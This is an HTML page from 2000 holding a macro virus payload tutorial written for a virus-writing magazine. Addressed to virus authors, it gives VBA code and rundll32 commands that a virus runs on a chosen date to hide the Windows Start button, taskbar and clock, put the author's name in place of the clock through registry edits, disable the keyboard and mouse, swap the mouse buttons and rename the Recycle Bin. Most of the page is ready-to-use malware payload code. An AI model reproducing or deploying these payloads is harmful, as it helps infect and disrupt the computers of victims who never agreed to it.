@@ -1,0 +1,295 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Macro Virus Payload Tutorial (Part 1)
+   </TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<P align="center"> <font color="#004080"><b><font size="+3">Macro Virus Payload 
+  Tutorial (Part 1) </font><br>
+  <font size="+1">(All you need to know about the hush-hush of MS Windows) </font><br>
+  Written by Black Knight (former Lucky Warrior) </b></font></P>
+<hr>
+<P>
+
+Hi! Guys, this is my very first time of writing macro virus tutorial in the virus society, many thanks, of course, to the editor 
+(Cicatrix) of this great virus database/magazine (the most complete & accurate, professionally handled, friendly user 
+interface, and a must for all virus writers) for giving me the opportunity for posting this tutorial. 
+</P><P>
+All payloads that I will show you in this tutorial are already available in the Black Knight Macro Virus Construction Kit v1.0 
+(BKMVCK).  And these entire payloads can be use, both in Ms Word, MS Excel, and MS Access macro viruses. 
+</P><P>
+The payloads that I'm saying are the following:
+</P>
+<ul>
+  <li> Hiding MS Windows Start Button </li>
+  <li>Hiding MS Windows Taskbar/System Tray </li>
+  <li>Hiding MS Windows Clock </li>
+  <li>Replacing MS Windows Clock w/ your name </li>
+  <li>The uncomplicated way to disable keyboard </li>
+  <li>The uncomplicated way to disable mouse button </li>
+  <li>The uncomplicated way of swapping mouse button </li>
+  <li>Renaming Recycle Bin </li>
+</ul>
+<P>
+So, here we go... 
+</P>
+<P> <font size="+1"><b>Hiding Windows Start Button</b></font></P>
+<P> First, we'll declare the Window API Function Declarations at the top of your 
+  virus module. Below are the API function declarations for hiding start button 
+  in windows: </P>
+<blockquote>
+  <PRE>
+Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" _
+       (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
+Public Declare Function ShowWindow Lib "user32" _
+       (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
+Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" _
+       (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) _
+       As Long
+</PRE>
+</blockquote>
+<P>
+Always remember to create a date/time activation code (otherwise, this will never work) that will call the HideStartButton 
+statement, you can place the activation code in the infection routine of your virus, it can be done this way:
+</P>
+<blockquote>
+  <PRE>
+If Day(Now) = 13 And Month(Now) = 8 Then Call HideStartButton
+</PRE>
+</blockquote>
+<P>
+You can set also this payload to be set to everyday of every month that will look like this:
+</P>
+<blockquote>
+  <PRE>
+If Day(Now) = Day(Now) And Month(Now) = Month(Now) Then Call HideStartButton
+</PRE>
+</blockquote>
+<P>
+Then, the "Sub" statement below are the most important part of hiding Start Button. The "Sub" statement is optional; you 
+can use either "Public/Private" or "Function".
+</P><P>
+The Sub statement (with matching End Sub statement) declares a procedure named HideStartButton. All the 
+statements enclosed by the Sub and End Sub statements are executed whenever the HideStartButton procedure is 
+called. 
+</P>
+<blockquote>
+  <PRE>
+Sub HideStartButton()
+Dim Handle As Long, FindClass As Long
+FindClass& = FindWindow("Shell_TrayWnd", "")
+Handle& = FindWindowEx(FindClass&, 0, "Button", vbNullString)
+ShowWindow Handle&, 0
+End Sub
+</PRE>
+</blockquote>
+<P>
+The zero (0) = Hide.
+</P><P>
+The ampersand (&) type-declaration character represents a Long in Visual Basic.
+</P>
+<P> <font size="+1"><b>Hiding Taskbar/System Tray</b></font></P>
+<P>
+The procedure of hiding the taskbar/system tray is very similar of hiding Start Button.  The declarations of API function,
+setting the activation code that will call the statement procedure.  To do this, simply follow these steps:
+</P><P>
+Declare the API functions at the top of your virus module:
+</P>
+<blockquote>
+  <PRE>
+Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" _
+       (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
+Public Declare Function ShowWindow Lib "user32" _
+       (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
+Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" _
+       (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) _
+       As Long
+</PRE>
+</blockquote>
+<P>
+Now, we'll declare the date/time activation code that will activate the payload, just like what we did when we hide the start 
+button:
+</P>
+<blockquote>
+  <PRE>
+If Day(Now) = 13 and Month(Now) = 8 Then Call HideTaskBarIcons
+</PRE>
+</blockquote>
+<P>
+You can set also the activation code to be set to everyday of every month, which will look like this:
+</P>
+<blockquote>
+  <PRE>
+If Day(Now) = Day(Now) and Month(Now) = Month(Now) Then Call HideTaskBarIcons
+</PRE>
+</blockquote>
+<P> Then, the "Sub" statement below are the most important part of hiding taskbar/system 
+  tray. The "Sub" statement is optional; you can use either "Public/Private" or 
+  "Function". The Sub statement (with matching End Sub statement) declares a procedure 
+  named HideTaskBarIcons. All the statements enclosed by the Sub and End Sub statements 
+  are executed whenever the HideTaskBarIcons procedure is called. </P>
+<blockquote>
+  <PRE>
+Sub HideTaskBarIcons()
+Dim FindClass As Long, Handle As Long
+FindClass& = FindWindow("Shell_TrayWnd", "")
+Handle& = FindWindowEx(FindClass&, 0, "TrayNotifyWnd", vbNullString)
+ShowWindow Handle&, 0
+End Sub
+</PRE>
+</blockquote>
+<P>
+The above statements is taken from the code of hiding start button, we replaced only the "Button" to "TrayNotifyWnd".
+</P><P>
+The zero (0) = Hide.
+</P><P>
+The ampersand (&) type-declaration character represents a Long in Visual Basic.
+</P>
+<P> <font size="+1"><b>Hiding MS Windows Clock</b></font></P>
+<P>
+As usual, the API declarations of hiding windows clock are no deference of hiding start button and taskbar/system tray.
+Declare the API functions at the top of your virus module:
+</P>
+<blockquote>
+  <PRE>
+Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" _
+       (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
+Public Declare Function ShowWindow Lib "user32" _
+       (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
+Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" _
+       (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) _
+       As Long
+</PRE>
+</blockquote>
+<P>
+As always, the date/time activation code is very important for this kind of payload:
+</P>
+<blockquote>
+  <PRE>
+If Day(Now) = 13 and Month(Now) = 8 Then Call HideTaskBarClock
+</PRE>
+</blockquote>
+<P>
+You can set also the payload to be set to everyday of every month that will look like this:
+</P>
+<blockquote>
+  <PRE>
+If Day(Now) = Day(Now) and Month(Now) = Month(Now) Then Call HideTaskBarClock
+</PRE>
+</blockquote>
+<P> Then, the "Sub" statement, the most important part of hiding windows clock. 
+  The "Sub" statement is optional; you can use either "Public/Private" or "Function". 
+</P>
+<P>The Sub statement (with matching End Sub statement) declares a procedure named 
+  HideTaskBarClock. All the statements enclosed by the Sub and End Sub statements 
+  are executed whenever the HideTaskBarClock procedure is called. </P>
+<blockquote>
+  <PRE>
+Sub HideTaskBarClock()
+Dim FindClass As Long, FindParent As Long, Handle As Long
+FindClass& = FindWindow("Shell_TrayWnd", vbNullString)
+FindParent& = FindWindowEx(FindClass&, 0, "TrayNotifyWnd", vbNullString)
+Handle& = FindWindowEx(FindParent&, 0, "TrayClockWClass", vbNullString)
+ShowWindow Handle&, 0
+End Sub
+</PRE>
+</blockquote>
+<P>
+The zero (0) = Hide.
+</P><P>
+The ampersand (&) type-declaration character represents a Long in Visual Basic.
+</P>
+<P> <font size="+1"><b>Replacing MS Windows Clock w/ your name</b></font> </P>
+<P>
+Replacing Windows clock w/ your own name is very amazing, but what the hell API functions do we need to replace the
+clock with your own name? According to Juan Dela Cruz (The most controversial man in the Philippines; Barok's 
+neighborhood), no need of API's, just add a pairs of string in the registry, you can do that by entering the following keys:
+</P>
+<blockquote>
+  <PRE>
+System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\CONTROL PANEL\INTERNATIONAL", "s1159") = "YourName"
+System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\CONTROL PANEL\INTERNATIONAL", "s2359") = "YourName"
+</PRE>
+</blockquote>
+<P>
+Note: Name must not exceed 8 characters! 
+</P><P>
+That's it, after victim restarts computer, they'll see your name besides the system tray, the clock is no longer in the system 
+tray, just try it. Very simple, isn't it?
+</P>
+<P> <font size="+1"><b>The uncomplicated way to disable keyboard</b></font> </P>
+<P>
+There's no need of API declarations, we'll use the "rundll32.exe" using the "Shell" function, that are located in the
+windows directory, and then, we'll call the "keyboard.drv" in the system directory of windows:
+</P>
+<blockquote>
+  <PRE>
+Shell "rundll32 keyboard,disable"
+</PRE>
+</blockquote>
+<P>
+You can also set date/time activation code for this kind of payload.
+</P>
+<P> <font size="+1"><b>The uncomplicated way to disable mouse button</b></font> 
+</P>
+<P>
+This function will disable mouse. The same with halting the keyboard, in this case, we'll call the "Mouse.drv" that located
+also in the system directory of windows:
+</P>
+<blockquote>
+  <PRE>
+Shell "rundll32 mouse,disable"
+</PRE>
+</blockquote>
+<P>
+You can also set date/time activation code for this kind of payload.
+</P>
+<P> <font size="+1"><b>The uncomplicated way of swapping mouse button</b></font> 
+</P>
+<P>
+Again, there's no need of API declarations, this time, we'll call the "User.exe" in the system directory of windows:
+</P>
+<blockquote>
+  <PRE>
+Shell "rundll32 user,swapmousebutton"
+</PRE>
+</blockquote>
+<P>
+If the mouse button is set to right, then it'll transfer to left, and so on.
+</P><P>
+You can also set date/time activation code for this payload.
+</P>
+<P> <font size="+1"><b>Renaming Recycle Bin</b></font></P>
+<P>
+Renaming Recycle Bin is only a piece of cake, we can do this by modifying the registry entry, that shown below:
+</P>
+<blockquote>
+  <PRE>
+System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\", "") = "Recycle Bin"
+</PRE>
+</blockquote>
+<P>
+You can replace the "Recycle Bin" with any characters you want.
+</P>
+<P> -------------- </P>
+<P>I'll end up here guys, this not mean to say that I'll stop writing this kind 
+  of tutorial, I'll do this again in the future/in my spare time or in the next 
+  release of VDAT. Please let us support VDAT, and please don't abuse it, because 
+  this is a great help to us. Thank you for reading all this, and have fun with 
+  the payloads that I've presented. </P>
+<P>
+Black Knight<BR>
+  <a href="mailto:black_knight@hotmail.com">black_knight@hotmail.com</a> </P>
+<P>
+
+#include &lt;disclaimer.h&gt;<BR>
+The author hereby disclaims himself.
+</P><P>
+No warrantee of any kind, expressed or implied, is included with this tutorial; use at your own risk, responsibility for 
+damages (if any) to anyone resulting from the use of this tutorial, and or spreading virus using the payloads that has been 
+presented by the author, rests entirely with the user.
+</P>
+<P> (C) June 2000 Warsoft Technology </P>
+<hr>
+</BODY>
+</HTML>
